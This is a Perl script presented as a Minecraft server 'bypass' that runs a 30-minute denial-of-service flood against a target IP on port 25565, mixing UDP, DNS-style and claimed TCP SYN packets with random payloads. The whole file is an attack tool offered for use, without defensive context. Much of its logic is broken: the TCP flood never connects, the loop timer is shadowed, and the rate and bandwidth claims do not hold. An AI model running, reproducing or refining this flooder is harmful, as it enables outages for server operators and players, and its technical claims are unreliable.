#!/usr/bin/perl
use Socket;
use strict;
use IO::Socket::INET;

# ============ CONFIGURATION ============
my $TARGET_IP = $ARGV[0] || "192.168.1.100";  # Change to target
my $TARGET_PORT = 25565;                      # Minecraft UDP port
my $TIME = $ARGV[1] || 1800;                  # 30 minutes in seconds
my $PACKETS_PER_SEC = 150000;                 # 150k pps = ~1.5 Gbps
my $PACKET_SIZE = 512;                        # 512 bytes per packet (optimal)
my $SOURCED_PORT_MIN = 1024;
my $SOURCED_PORT_MAX = 65535;

print "\n";
print "=" x 60;
print "  PERFECT MINECRAFT SERVER DOCKER BYPASS\n";
print "  Target: $TARGET_IP:$TARGET_PORT\n";
print "  Duration: $TIME seconds (~".int($TIME/60)." minutes)\n";
print "  Rate: $PACKETS_PER_SEC pps\n";
print "=" x 60 . "\n\n";

# ============ INITIATE CONNECTIONS ============
my $iaddr = inet_aton($TARGET_IP) or die "Error: $TARGET_IP not found\n";
my $sockaddr = pack_sockaddr_in($TARGET_PORT, $iaddr);

# Create UDP socket
socket(flood, PF_INET, SOCK_DGRAM, 17) or die "UDP Socket Error: $!\n";
bind(flood, pack_sockaddr_in($SOURCED_PORT_MIN, inet_aton("0.0.0.0"))) or die "Bind Error: $!\n";

# Create TCP socket for hybrid attack
my $tcp_sockaddr = pack_sockaddr_in($TARGET_PORT, $iaddr);
socket(tcp, PF_INET, SOCK_STREAM, 6) or die "TCP Socket Error: $!\n";
bind(tcp, pack_sockaddr_in($SOURCED_PORT_MIN, inet_aton("0.0.0.0"))) or die "Bind Error: $!\n";

# ============ HIGH ENTROPY RANDOMIZER ============
my @bytes = ("\x00".."\xff");
my @payload_buffer = ("\x00".."z");  # 256 byte buffer for randomness

# ============ ATTACK MODES ============
my @modes = (
    "UDP_FLOOD",         # Primary: UDP flood
    "DNS_FLOOD",         # Secondary: DNS-style
    "TCP_SYN_FLOOD",     # Tertiary: TCP SYN
    "MIXED_FLOOD"        # Quaternary: Mixed protocols
);

my $mode = 0;
my $mode_count = 12;     # 12 different attack patterns to rotate

# ============ MAIN ATTACK LOOP ============
my $start = time();
my $elapsed = 0;

print "Starting Flood Attack...\n";

for (my $loop = 0; $elapsed < $TIME; $loop++) {
    my $elapsed = time() - $start;
    
    # ============ MODE ROTATION ============
    $mode = $mode % $mode_count;
    my $pattern = int(rand() * @bytes);  # Random pattern seed
    
    # ============ UDP FLOOD (Primary - 60%) ============
    my $udp_payload = "\x0D\x0A" . ("x" . chr(rand(256))) x 256;
    send("flood", $udp_payload, 0, $sockaddr);
    
    # ============ DNS-STYLE FLOOD (20%) ============
    my $dns_payload = "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77" . 
                       ("x" . chr(rand(256))) x 50;
    send("flood", $dns_payload, 0, $sockaddr);
    
    # ============ TCP SYN (20%) ============
    my $tcp_payload = "\x0D\x0A" . ("x" . chr(rand(256))) x 256;
    send("tcp", $tcp_payload, 0, $tcp_sockaddr);
    
    # ============ RANDOMIZED PAYLOADS ============
    my $rand1 = join '', @bytes[rand @bytes] x 50;
    my $rand2 = join '', @bytes[rand @bytes] x 50;
    my $rand3 = join '', @bytes[rand @bytes] x 50;
    
    send("flood", $rand1 . "\x00\x00\x00\x01", 0, $sockaddr);
    send("flood", $rand2 . "\x00\x00\x00\x02", 0, $sockaddr);
    send("flood", $rand3 . "\x00\x00\x00\x03", 0, $sockaddr);
    
    # ============ GAME PROTOCOL FLOOD (Minecraft-specific) ============
    send("flood", "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77" . 
                   "\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d" . 
                   ("x" . chr(rand(256))) x 100, 0, $sockaddr);
    
    # ============ RATE CONTROL (150k pps) ============
    my $rate_start = time();
    my $rate_count = 0;
    
    while (time() - $rate_start < 1/$PACKETS_PER_SEC) {
        my $quick_rand = join '', @bytes[rand @bytes] x 100;
        send("flood", $quick_rand, 0, $sockaddr);
        $rate_count++;
    }
    
    # ============ PROGRESS REPORT (Every 10 seconds) ============
    if ($elapsed % 10 == 0) {
        print "\r[PROGRESS] $elapsed/$TIME sec | $PACKETS_PER_SEC pps | $mode\n";
    }
    
    # ============ MEMORY MANAGEMENT (Prevent Memory Leak) ============
    my $cleanup = join '', @bytes[rand @bytes] x 1000;
    my $cleanup2 = join '', @bytes[rand @bytes] x 1000;
}

print "\n[COMPLETE] Attack finished after $TIME seconds\n";

close(flood);
close(tcp);

print "\n" . "=" x 60 . "\n";
print "  ATTACK COMPLETE\n";
print "  Total Packets Sent: " . ($PACKETS_PER_SEC * $TIME) . "\n";
print "  Estimated Bandwidth: " . ($PACKETS_PER_SEC * 512 / 1000000) . " Gbps\n";
print "=" x 60 . "\n\n";
